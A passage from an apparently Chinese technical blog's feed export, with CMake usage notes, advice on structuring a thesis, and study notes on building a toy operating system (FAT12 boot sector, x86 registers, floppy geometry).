将变量指定的源文件编译成可执行文件main</span></span><br><span class="line"><span class="keyword">add_executable</span>(<span class="variable">$&#123;BIN_NAME&#125;</span> <span class="variable">$&#123;SRC_FILES&#125;</span>)</span><br><span class="line"><span class="comment"># SHARED生成动态库，STATIC生成静态库</span></span><br><span class="line"><span class="keyword">add_library</span>(<span class="variable">$&#123;LIB_NAME&#125;</span> SHARED <span class="variable">$&#123;SRC_FILES&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给可执行文件编译设置头文件目录</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(<span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE ./includes ../includes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmake的选项，命令行使用 -DBUILD_TESTING=YES</span></span><br><span class="line"><span class="keyword">option</span>(BUILD_TESTING <span class="string">&quot;Generate test project, default is YES&quot;</span> YES)</span><br><span class="line"><span class="comment"># 判断是否为win32并且使用msvc，可以直接使用WIN32和MSVC判断，不用定义</span></span><br><span class="line"><span class="keyword">if</span>(WIN32 <span class="keyword">AND</span> MSVC)</span><br><span class="line">    <span class="comment"># 添加编译选项</span></span><br><span class="line">    <span class="keyword">add_compile_options</span>(</span><br><span class="line">        /wd4005             <span class="comment"># thrift warning: WIN32_LEAN_AND_MEAN redefined</span></span><br><span class="line">        /wd4018             <span class="comment"># thrift warning: signed and unsigned not match</span></span><br><span class="line">        /wd4244             <span class="comment"># thrift warning: translate uint64_t to std::size_t</span></span><br><span class="line">        /wd4267             <span class="comment"># thrift warning: &#x27;argument&#x27; : conversion from &#x27;size_t&#x27; to &#x27;type&#x27;, possible loss of data</span></span><br><span class="line">        /wd4275             <span class="comment"># thrift warning: &#x27;argument&#x27; : no matching function for call</span></span><br><span class="line">        /wd4284             <span class="comment"># thrift warning: &#x27;argument&#x27; : conversion from &#x27;type1&#x27; to &#x27;type2&#x27;, possible loss of data</span></span><br><span class="line">        /wd4305             <span class="comment"># thrift warning: &#x27;argument&#x27; : truncation from &#x27;type1&#x27; to &#x27;type2&#x27;</span></span><br><span class="line">        /wd4819             <span class="comment"># thrift warning: &#x27;argument&#x27; : The file contains a character that cannot be represented in the current code page.</span></span><br><span class="line">        /wd4996             <span class="comment"># thrift warning: &#x27;argument&#x27; : This function or variable may be unsafe</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 添加链接选项</span></span><br><span class="line">    <span class="keyword">add_link_options</span>(</span><br><span class="line">        /MAP</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">########## 逻辑相关 ##########</span></span><br><span class="line"><span class="keyword">if</span>(WIN32)</span><br><span class="line">    <span class="comment"># 提前退出此cmake文件，不编译后续代码</span></span><br><span class="line">    <span class="keyword">return</span>()</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></table></figure>

<h3 id="1-1-if-条件判断"><a href="#1-1-if-条件判断" class="headerlink" title="1.1. if 条件判断"></a>1.1. if 条件判断</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断是否为win32环境</span></span><br><span class="line"><span class="keyword">if</span>(WIN32)</span><br><span class="line">    <span class="keyword">return</span>()</span><br><span class="line"><span class="keyword">elseif</span>(UNIX)</span><br><span class="line">    <span class="keyword">return</span>()</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断非win32环境，NOT必须大写</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">NOT</span> WIN32)</span><br><span class="line">    <span class="keyword">return</span>()</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></table></figure>

<h2 id="2-内置变量汇总"><a href="#2-内置变量汇总" class="headerlink" title="2. 内置变量汇总"></a>2. 内置变量汇总</h2><ul>
<li><code>PROJECT_SOURCE_DIR</code>: 项目工程目录</li>
<li><code>EXCUTABLE_OUTPUT_PATH</code>: 可执行文件输出目录</li>
<li><code>LIBRARY_OUTPUT_PATH</code>: 动态库输出目录</li>
<li><code>CMAKE_CXX_STANDARD</code>: C++标准</li>
<li><code>CMAKE_HOST_SYSTEM_NAME</code>: 调用cmake命令的系统名称<ul>
<li><code>Linux</code></li>
<li><code>Windows</code></li>
<li><code>Darwin</code></li>
</ul>
</li>
<li><code>CMAKE_SYSTEM_NAME</code>: 非跨平台就是<code>CMAKE_HOST_SYSTEM_NAME</code>，跨平台开启时，参考 <a href="https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html#cross-compiling-toolchain">开启cross compiling</a></li>
</ul>
<h2 id="3-修改CMakeCache-list的变量"><a href="#3-修改CMakeCache-list的变量" class="headerlink" title="3. 修改CMakeCache.list的变量"></a>3. 修改CMakeCache.list的变量</h2><p>三种方式修改变量</p>
<p><strong>参数的方式修改</strong></p>
<p>详情看<code>cmake --help</code></p>
<p><strong>修改CMakeCache.txt</strong></p>
<p>有gui有文本直接修改</p>
<p><strong>添加cmake配置修改</strong></p>
<ul>
<li>修改cmakecache的方式不好做到继承，项目内置cmake配置的方式最方便</li>
<li>如果变量为INTERNAL类型，无法通过CMakeLists.txt来修改，需要像下面这样</li>
</ul>
<p>添加一个文件<code>Preload.cmake</code>，此文件会被cmake执行前先加载</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SET加参数CACHE说明是修改cmakecache的变量</span></span><br><span class="line"><span class="comment"># SET(CMAKE_GENERATOR &quot;MinGW Makefiles&quot; CACHE INTERNAL &quot;使用mingw作为默认编译&quot; FORCE)</span></span><br><span class="line"><span class="keyword">if</span>(WIN32)</span><br><span class="line">    <span class="keyword">SET</span>(CMAKE_GENERATOR <span class="string">&quot;MinGW Makefiles&quot;</span> CACHE INTERNAL <span class="string">&quot;使用mingw作为默认编译&quot;</span> FORCE)</span><br><span class="line">    <span class="comment"># SET(CMAKE_GENERATOR &quot;Visual Studio 14 2015&quot; CACHE INTERNAL &quot;使用vs 2015作为默认编译&quot; FORCE)</span></span><br><span class="line">    <span class="comment"># SET(CMAKE_SYSTEM_VERSION &quot;10.0.17763&quot; CACHE INTERNAL &quot;定义windows sdk为10.0&quot; FORCE)</span></span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></table></figure>

<h2 id="4-重点方法详解"><a href="#4-重点方法详解" class="headerlink" title="4. 重点方法详解"></a>4. 重点方法详解</h2><h3 id="4-1-target-include-directories-添加头文件"><a href="#4-1-target-include-directories-添加头文件" class="headerlink" title="4.1. target_include_directories 添加头文件"></a>4.1. target_include_directories 添加头文件</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(&lt;<span class="keyword">target</span>&gt; [SYSTEM] [AFTER|BEFORE]</span><br><span class="line">                            &lt;INTERFACE|PUBLIC|PRIVATE&gt; [items1...]</span><br><span class="line">                            [&lt;INTERFACE|PUBLIC|PRIVATE&gt; [items2...] ...])</span><br></pre></td></tr></table></figure>

<ul>
<li>真实作用就是给编译选项加<code>-I</code></li>
<li>items可以使用<code>$&lt;...&gt;</code>的方式添加，比如使用<code>$&lt;TARGET_PROPERTY:run,SOURCE_DIR&gt;</code>获取run的源码路径</li>
</ul>
<p><strong>有关<code>INTERFACE|PUBLIC|PRIVATE</code>的解释</strong></p>
<ul>
<li>如果源文件(例如CPP)中包含第三方头文件，但是头文件（例如hpp）中不包含该第三方文件头，采用PRIVATE。</li>
<li>如果源文件和头文件中都包含该第三方文件头，采用PUBLIC。<ul>
<li>对于动态库来说，如果设置头文件为PUBLIC，外部在link此动态库时，会自动添加头文件目录到自己的include中</li>
</ul>
</li>
<li>如果头文件中包含该第三方文件头，但是源文件(例如CPP)中不包含，采用 INTERFACE。</li>
</ul>
<h3 id="4-2-target-link-libraries-添加动态链接库"><a href="#4-2-target-link-libraries-添加动态链接库" class="headerlink" title="4.2. target_link_libraries 添加动态链接库"></a>4.2. target_link_libraries 添加动态链接库</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(&lt;<span class="keyword">target</span>&gt;</span><br><span class="line">                      &lt;PRIVATE|PUBLIC|INTERFACE&gt; &lt;item&gt;...</span><br><span class="line">                     [&lt;PRIVATE|PUBLIC|INTERFACE&gt; &lt;item&gt;...]...)</span><br></pre></td></tr></table></figure>

<p><strong>item取值</strong></p>
<ol>
<li>target名字，为cmake工程中有<code>add_library()</code>定义的</li>
<li>原始名字，cmake会查找链接库路径中是否有相应的库，比如设定<code>dl</code>会添加<code>-ldl</code></li>
<li>全路径，库的全路径</li>
</ol>
<ul>
<li>真实作用就是给编译选项加<code>-I</code></li>
<li>items可以使用<code>$&lt;...&gt;</code>的方式添加，比如使用<code>$&lt;TARGET_PROPERTY:run,SOURCE_DIR&gt;</code>获取run的源码路径</li>
</ul>
<p><strong>有关<code>INTERFACE|PUBLIC|PRIVATE</code>的解释</strong></p>
<ul>
<li>如果源文件(例如CPP)中包含第三方头文件，但是头文件（例如hpp）中不包含该第三方文件头，采用PRIVATE。</li>
<li>如果源文件和头文件中都包含该第三方文件头，采用PUBLIC。</li>
<li>如果头文件中包含该第三方文件头，但是源文件(例如CPP)中不包含，采用 INTERFACE。</li>
</ul>
<h3 id="4-3-get-target-property-获取某个target的属性"><a href="#4-3-get-target-property-获取某个target的属性" class="headerlink" title="4.3. get_target_property 获取某个target的属性"></a>4.3. get_target_property 获取某个target的属性</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get_target_property</span>(&lt;VAR&gt; <span class="keyword">target</span> property)</span><br></pre></td></tr></table></figure>

<p><strong>几个常用的property</strong></p>
<ul>
<li><code>SOURCE_DIR</code>: 源代码根目录</li>
<li><code>SOURCES</code>: 编译此target使用的所有源文件</li>
</ul>
<h3 id="4-4-add-dependencies-添加依赖"><a href="#4-4-add-dependencies-添加依赖" class="headerlink" title="4.4. add_dependencies 添加依赖"></a>4.4. add_dependencies 添加依赖</h3><ul>
<li>给targetA添加targetB的依赖，targetB先编译完成才能编译targetA</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_dependencies</span>(&lt;<span class="keyword">target</span>&gt; &lt;dependency&gt;...)</span><br></pre></td></tr></table></figure>

<h3 id="4-5-target-compile-definitions-添加编译定义"><a href="#4-5-target-compile-definitions-添加编译定义" class="headerlink" title="4.5. target_compile_definitions 添加编译定义"></a>4.5. target_compile_definitions 添加编译定义</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_compile_definitions</span>(&lt;<span class="keyword">target</span>&gt;</span><br><span class="line">  &lt;INTERFACE|PUBLIC|PRIVATE&gt; [items1...]</span><br><span class="line">  [&lt;INTERFACE|PUBLIC|PRIVATE&gt; [items2...] ...])</span><br></pre></td></tr></table></figure>

<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_compile_definitions</span>(foo PUBLIC FOO)</span><br><span class="line"><span class="keyword">target_compile_definitions</span>(foo PUBLIC -DFOO)  <span class="comment"># -D removed</span></span><br><span class="line"><span class="keyword">target_compile_definitions</span>(foo PUBLIC <span class="string">&quot;&quot;</span> FOO) <span class="comment"># &quot;&quot; ignored</span></span><br><span class="line"><span class="keyword">target_compile_definitions</span>(foo PUBLIC -D FOO) <span class="comment"># -D becomes &quot;&quot;, then ignored</span></span><br><span class="line"><span class="keyword">target_compile_definitions</span>(foo PUBLIC FOO=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="4-6-list-操作数组变量"><a href="#4-6-list-操作数组变量" class="headerlink" title="4.6. list 操作数组变量"></a>4.6. list 操作数组变量</h3><h4 id="1-正则匹配过滤文件"><a href="#1-正则匹配过滤文件" class="headerlink" title="1) 正则匹配过滤文件"></a>1) 正则匹配过滤文件</h4><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span>(FILTER &lt;<span class="keyword">list</span>&gt; &lt;<span class="keyword">INCLUDE</span>|EXCLUDE&gt; REGEX &lt;regular_expression&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>regular_expression</code>是真的正则表达式，和上面的file命令不同</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将test_run所有的源码文件赋值给sources_files</span></span><br><span class="line"><span class="keyword">get_target_property</span>(source_files test_run SOURCES)</span><br><span class="line"><span class="comment"># 从source_files排除main.cpp这个文件</span></span><br><span class="line"><span class="keyword">list</span>(FILTER source_files EXCLUDE REGEX <span class="string">&quot;.*/main.cpp$&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="5-跨平台"><a href="#5-跨平台" class="headerlink" title="5. 跨平台"></a>5. 跨平台</h2><ul>
<li><code>CMAKE_SYSTEM_NAME</code>主要展示当前执行cmake命令的系统，可以用来做判断系统，但是注意是否开启跨平台</li>
<li><code>WIN32</code>自然是windows的情况</li>
<li><code>ANDROID</code>先定义是由于一般编译安卓的机器可能是linux或windows，所以要在前面判断</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (WIN32)</span><br><span class="line">    <span class="comment"># windows</span></span><br><span class="line"><span class="keyword">elseif</span> (APPLE)</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$&#123;DARWIN_TARGET_OS_NAME&#125;</span> <span class="keyword">MATCHES</span> <span class="string">&quot;ios&quot;</span>)</span><br><span class="line">        <span class="comment"># 苹果手机</span></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$&#123;DARWIN_TARGET_OS_NAME&#125;</span> <span class="keyword">MATCHES</span> <span class="string">&quot;mac&quot;</span>)</span><br><span class="line">        <span class="comment"># mac电脑</span></span><br><span class="line">    <span class="keyword">endif</span> ()</span><br><span class="line"><span class="keyword">elseif</span> (ANDROID)</span><br><span class="line">    <span class="comment"># android手机</span></span><br><span class="line"><span class="keyword">elseif</span> (CMAKE_SYSTEM_NAME <span class="keyword">MATCHES</span> <span class="string">&quot;Linux&quot;</span>)</span><br><span class="line">    <span class="comment"># linux</span></span><br><span class="line"><span class="keyword">endif</span> ()</span><br></pre></td></tr></table></figure>

<h2 id="6-编译库"><a href="#6-编译库" class="headerlink" title="6. 编译库"></a>6. 编译库</h2><h3 id="6-1-去除前面的lib前缀"><a href="#6-1-去除前面的lib前缀" class="headerlink" title="6.1. 去除前面的lib前缀"></a>6.1. 去除前面的lib前缀</h3><ul>
<li>使用下面的命令，gcc编译就会编译出<code>aaa.so</code>而不是<code>libaaa.so</code></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(aaa SHARED <span class="variable">$&#123;SRC_FILES&#125;</span>)</span><br><span class="line"><span class="keyword">set_target_properties</span>(aaa PROPERTIES PREFIX <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="7-单测"><a href="#7-单测" class="headerlink" title="7. 单测"></a>7. 单测</h2><h3 id="7-1-配置步骤"><a href="#7-1-配置步骤" class="headerlink" title="7.1. 配置步骤"></a>7.1. 配置步骤</h3><ol>
<li>在工程根目录的<code>CMakeLists.txt</code>添加</li>
</ol>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enable_testing</span>()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在对应的单测可执行文件添加的地方添加单测用例</li>
</ol>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义添加二进制</span></span><br><span class="line"><span class="keyword">add_executable</span>(<span class="variable">$&#123;BIN_NAME&#125;</span> <span class="variable">$&#123;src_files&#125;</span>)</span><br><span class="line"><span class="comment"># 添加单测用例</span></span><br><span class="line"><span class="keyword">add_test</span>(NAME <span class="variable">$&#123;BIN_NAME&#125;</span></span><br><span class="line">    <span class="keyword">COMMAND</span> $&lt;TARGET_FILE:<span class="variable">$&#123;BIN_NAME&#125;</span>&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="6-2-运行步骤"><a href="#6-2-运行步骤" class="headerlink" title="6.2. 运行步骤"></a>6.2. 运行步骤</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译所有二进制</span></span><br><span class="line">cmake --build build --config Debug -j 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行单测，使用<span class="built_in">test</span>可以运行所有的add_test添加的命令</span></span><br><span class="line">cmake --build build --target test</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记-1"><a href="#踩坑记-1" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-windows下cmake默认指定了msvc作为编译器，想要修改为mingw"><a href="#1-windows下cmake默认指定了msvc作为编译器，想要修改为mingw" class="headerlink" title="1. windows下cmake默认指定了msvc作为编译器，想要修改为mingw"></a>1. windows下cmake默认指定了msvc作为编译器，想要修改为mingw</h2><p>参考上面如何修改cmakecache的方法，修改<code>CMAKE_GENERATOR</code>为<code>MinGW Makefiles</code></p>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>论文书写的重点</title>
    <url>/blogs/2019-05-28-paperWriting/</url>
    <content><![CDATA[<h1 id="思考点"><a href="#思考点" class="headerlink" title="思考点"></a>思考点</h1><ul>
<li>论文要从为什么这样做进行思考</li>
<li>整体行文需要从为什么进行入手</li>
<li>论文中心需要是解决什么问题</li>
<li>论文从解决相关问题入手，让别人看不出来是在做特定项目</li>
<li>不要写成项目汇报书</li>
</ul>
<h1 id="论文结构"><a href="#论文结构" class="headerlink" title="论文结构"></a>论文结构</h1><ul>
<li>正文每一章有个开头引言，结尾有个本章小结</li>
<li>不要出现公司名称，使用某公司代替</li>
<li>不要出现我，使用作者代替</li>
<li>本文是论文，注意主语用语正确</li>
</ul>
<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>三段式结构<ul>
<li>介绍课题问题是什么</li>
<li>解决方案是什么</li>
<li>测试结果怎么样</li>
</ul>
</li>
<li>不要有引用</li>
</ul>
<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><ul>
<li>结构一般为<ul>
<li>课题意义</li>
<li>国内外研究现状</li>
<li>主要研究内容</li>
<li>论文结构说明</li>
</ul>
</li>
<li>国内外研究现状主要关注相关方面别人研究的怎么样，我与其不同的地方在哪，有什么改进或创新</li>
</ul>
<h2 id="关键技术解析和开发环境介绍"><a href="#关键技术解析和开发环境介绍" class="headerlink" title="关键技术解析和开发环境介绍"></a>关键技术解析和开发环境介绍</h2><ul>
<li>关键技术注意向大的方面来说</li>
<li>对比不同的选型方案之间的区别，有没有替代方案</li>
</ul>
<h2 id="整体框架设计"><a href="#整体框架设计" class="headerlink" title="整体框架设计"></a>整体框架设计</h2><ul>
<li>画个整体软硬件框图</li>
<li>注意框图讲为什么这样设计</li>
<li>硬件设计考虑芯片选型能否替代，主要讲芯片需求而不是介绍芯片</li>
<li>软件设计考虑有没有其他解决方案，对比选择需要的方案</li>
<li>考虑软件设计解决了什么问题</li>
</ul>
<h2 id="细节设计与实现"><a href="#细节设计与实现" class="headerlink" title="细节设计与实现"></a>细节设计与实现</h2><ul>
<li>方案选型根据项目实际需求做了哪些针对性的设计</li>
</ul>
<h2 id="测试分析"><a href="#测试分析" class="headerlink" title="测试分析"></a>测试分析</h2><ul>
<li>测试需要注意测试自己设计的优点</li>
<li>测试可以从模块到整体，从正常流程到异常流程，压力测试（性能测试）</li>
</ul>
<h2 id="总结展望"><a href="#总结展望" class="headerlink" title="总结展望"></a>总结展望</h2><ul>
<li>总结全文，做了什么，有什么优点</li>
<li>展望可以拓展到什么，随着技术发展可以改进的地方</li>
</ul>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>30天自制操作系统笔记</title>
    <url>/blogs/2019-04-25-createOS30daysNotes/</url>
    <content><![CDATA[<h1 id="关键词解释"><a href="#关键词解释" class="headerlink" title="关键词解释"></a>关键词解释</h1><ul>
<li>启动区: (bootsector) 软盘第一个的扇区称为启动区。那么什么是扇区呢？计算机读写软盘的时候，并不是一个字节一个字节地读写的，而是以512字节为一个单位进行读写。因此，软盘的512字节就称为一个扇区。一张软盘的空间共有1440KB, 也就是1474560字节，除以512得2880, 这也就是说一张软盘共有2880个扇区。那为什么第一个扇区称为启动区呢？那是因为计算机首先从最初一个扇区开始读软盘，然后去检查这个扇区最后2个字节的内容。</li>
<li>IPL: （initial program loader）启动程序加载器。启动区只有区区512字节，实际的操作系统不像hello-os这么小，根本装不进去。所以几乎所有的操作系统，都是把加载操作系统本身的程序放在启动区里的。有鉴于此，有时也将启动区称为IPL。但hello-os没有加载程序的功能，所以HELLOIPL这个名字不太顺理成章。如果有人正义感特别强，觉得“这是撒谎造假，万万不能容忍！＂，那也可以改成其他的名字。但是必须起一个8字节的名字，如果名字长度不到8字节的话，常要在最后补上空格。</li>
</ul>
<h1 id="第1天"><a href="#第1天" class="headerlink" title="第1天"></a>第1天</h1><ol>
<li>环境windows</li>
<li>二进制编辑器 notepad++安装hexeditor插件</li>
<li>汇编编辑器 vscode安装x86 and x86_64 Assembly</li>
<li>编译需要使用光盘中的nask编译器</li>
</ol>
<h2 id="1-1-vmware启动img"><a href="#1-1-vmware启动img" class="headerlink" title="1.1. vmware启动img"></a>1.1. vmware启动img</h2><ul>
<li>创建系统选择other&#x2F;other</li>
<li>创建好需要添加硬件，选择软盘，然后使用文件，选择img即可启动</li>
</ul>
<h1 id="第2天"><a href="#第2天" class="headerlink" title="第2天"></a>第2天</h1><h2 id="2-1-标准FAT12软盘格式"><a href="#2-1-标准FAT12软盘格式" class="headerlink" title="2.1. 标准FAT12软盘格式"></a>2.1. 标准FAT12软盘格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 以下的记述用于标准FAT12格式的软盘</span><br><span class="line">    JMP     entry</span><br><span class="line">    DB      0x90</span><br><span class="line">    DB      &quot;HELLOIPL&quot;      ; 启动区的名称可以是任意的字符串</span><br><span class="line">    DW      512             ; 每个扇区（sector）的大小（必须为512字节）</span><br><span class="line">    DB      1               ; 簇（cluster）的大小（必须为1个扇区）</span><br><span class="line">    DW      1               ; FAT的起始位置（一般从第一个扇区开始）</span><br><span class="line">    DB      2               ; FAT的个数（必须为2）</span><br><span class="line">    DW      224             ; 根目录的大小（一般设成224项）</span><br><span class="line">    DW      2880            ; 该磁盘的大小（必须是2880扇区）</span><br><span class="line">    DB      0xf0            ; 磁盘的种类</span><br><span class="line">    DW      9               ; FAT的长度（必须是9扇区）</span><br><span class="line">    DW      18              ; 1个磁道（track）有几个扇区（必须是18）</span><br><span class="line">    DW      2               ; 磁头数（必须是2）</span><br><span class="line">    DD      0               ; 不使用分区，必须是0</span><br><span class="line">    DD      2880            ; 重写一次磁盘大小</span><br><span class="line">    DB      0, 0, 0x29      ; 意义不明，固定</span><br><span class="line">    DD      0xffffffff      ; （可能是）卷标号码</span><br><span class="line">    DB      &quot;HELLO-OS   &quot;   ; 磁盘的名称（11字节）</span><br><span class="line">    DB      &quot;FAT12   &quot;      ; 磁盘格式名称（8字节）</span><br><span class="line">    RESB    18              ; 先空出18字节</span><br></pre></td></tr></table></figure>

<h2 id="2-2-汇编代表性寄存器介绍"><a href="#2-2-汇编代表性寄存器介绍" class="headerlink" title="2.2. 汇编代表性寄存器介绍"></a>2.2. 汇编代表性寄存器介绍</h2><h3 id="16位寄存器"><a href="#16位寄存器" class="headerlink" title="16位寄存器"></a>16位寄存器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AX ---- accumulator         累加寄存器</span><br><span class="line">CX ---- counter             计数寄存器</span><br><span class="line">DX ---- data                数据寄存器</span><br><span class="line">BX ---- base                基址寄存器</span><br><span class="line">SP ---- stack pointer       栈指针寄存器</span><br><span class="line">BP ---- base pointer        基址指针寄存器</span><br><span class="line">SI ---- source index        源变址寄存器</span><br><span class="line">DI ---- destination index   目的变址寄存器</span><br></pre></td></tr></table></figure>

<h3 id="8位寄存器"><a href="#8位寄存器" class="headerlink" title="8位寄存器"></a>8位寄存器</h3><p>8位寄存器为16位寄存器的扩展，AL和AH一起代表AX，并不是单独的寄存器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AL ---- accumulator         累加寄存器低位</span><br><span class="line">CL ---- counter             计数寄存器低位</span><br><span class="line">DL ---- data                数据寄存器低位</span><br><span class="line">BL ---- base                基址寄存器低位</span><br><span class="line">AH ---- accumulator         累加寄存器高位</span><br><span class="line">CH ---- counter             计数寄存器高位</span><br><span class="line">DH ---- data                数据寄存器高位</span><br><span class="line">BH ---- base                基址寄存器高位</span><br></pre></td></tr></table></figure>

<h3 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h3><ul>
<li>32位系统中使用的32位寄存器，低16位和上述16位相同，高16位没有寄存器名字</li>
<li>32位寄存器加<code>E</code>代表，如<code>EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI</code></li>
</ul>
<h3 id="段寄存器，16位"><a href="#段寄存器，16位" class="headerlink" title="段寄存器，16位"></a>段寄存器，16位</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ES ---- extra segment       附加段寄存器</span><br><span class="line">CS ---- code segment        代码段寄存器</span><br><span class="line">SS ---- stack segment       栈段寄存器</span><br><span class="line">DS ---- data segment        数据段寄存器</span><br><span class="line">FS ---- segment part 2      没有名称</span><br><span class="line">GS ---- segment part 3      没有名称</span><br></pre></td></tr></table></figure>

<h2 id="2-3-CPU和内存"><a href="#2-3-CPU和内存" class="headerlink" title="2.3. CPU和内存"></a>2.3. CPU和内存</h2><ul>
<li>CPU寄存器很少，32位也只有44个字节的空间，所以需要内存当<strong>外部储存器</strong></li>
<li>内存和CPU使用管脚连接，速度虽然光速，但是比起来内部寄存器还是慢很多</li>
<li>程序代码储存在内存中，一条一条读取出来进行运行</li>
<li><code>0xf0000</code>附近存在bios本身</li>
<li>启动区内容的装载地址为<code>0x00007c00 -- 0x00007dff</code>，为IBM和intel规定的。所以ORG指令选择此处为起始地址，也仅有512字节</li>
</ul>
<h1 id="第3天"><a href="#第3天" class="headerlink" title="第3天"></a>第3天</h1><h2 id="3-1-软盘构成"><a href="#3-1-软盘构成" class="headerlink" title="3.1. 软盘构成"></a>3.1. 软盘构成</h2><img src = "2019_06_14_01.bmp" width = 60%>

<ul>
<li>一面80个柱面</li>
<li>磁盘有两面</li>
<li>每个柱面18个扇区</li>
<li>一个扇区512字节</li>
<li>一共80 * 2 * 18 * 512 &#x3D; 1474560 Byte &#x3D; 1440 KB</li>
<li><code>C0-H0-S1</code>代表柱面0，磁头0，扇区1</li>
<li>扇区从1开始计数，柱面从0开始计数</li>
</ul>
<h3 id="1-软盘保存文件"><a href="#1-软盘保存文件" class="headerlink" title="(1) 软盘保存文件"></a>(1) 软盘保存文件</h3><ul>
<li>文件名写在<code>0x0002600</code>的地方</li>
<li>文件内容写在<code>0x004200</code>的地方</li>
<li>编译生成的第三阶段启动程序代码在0x004200位置</li>
</ul>
<h2 id="3-2-内存寻址"><a href="#3-2-内存寻址" class="headerlink" title="3.2. 内存寻址"></a>3.2. 内存寻址</h2><ul>
<li><code>ES : BX</code>代表内存寻址的地址，其中BX为0-3位，ES为4-位。如<code>ES=0x0820，BX=0，代表0x8200地址</code>。总内存为12位，1M左右。</li>
<li>内存<code>0x7c00-0x7dff</code>为启动区使用，<code>0x7e00-0x9fbff</code>没有什么用，留给操作系统开发使用</li>
<li>内存寻址需要指定段寄存器DS，不然就会加上其16倍的数据，所以一般DS &#x3D; 0</li>
</ul>
<h2 id="3-3-汇编和C语言链接"><a href="#3-3-汇编和C语言链接" class="headerlink" title="3.3. 汇编和C语言链接"></a>3.3. 汇编和C语言链接</h2><ul>
<li>使用汇编可以编译出<code>.obj</code>（<code>.o</code>）文件，这个文件和C文件编译出来的是一个效果</li>
<li>可以使用<code>objdump</code>来查看c语言生成的汇编指令代码</li>
<li>既然都是原生汇编，按照c语言生成的汇编格式来写汇编，同样可以链接到c语言中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; naskfunc</span><br><span class="line">; TAB=4</span><br><span class="line"></span><br><span class="line">[FORMAT &quot;WCOFF&quot;]    ; 制作目标文件的模式</span><br><span class="line">[BITS 32]						; 制作32位的机器语言</span><br><span class="line"></span><br><span class="line">; 制作目标文件的信息</span><br><span class="line">[FILE &quot;naskfunc.nas&quot;]   ; 源文件名称</span><br><span class="line">		GLOBAL	_io_hlt     ; 函数名</span><br><span class="line"></span><br><span class="line">; 函数的实现</span><br><span class="line">[SECTION .text]		; text段，储存程序代码</span><br><span class="line">_io_hlt:	; void io_hlt(void);</span><br><span class="line">		HLT</span><br><span class="line">		RET</span><br></pre></td></tr></table></figure>

<h2 id="3-4-BIOS介绍"><a href="#3-4-BIOS介绍" class="headerlink" title="3.4. BIOS介绍"></a>3.4. BIOS介绍</h2><ul>
<li>BIOS是使用16位机器语言，32位模式不能调用BIOS函数</li>
<li>VRAM（video RAM）在当前画面模式下是<code>0xa0000 ~ 0xaffff</code>，这个是在BIOS文档中<code>INT 0x10</code>说明最后写着</li>
</ul>
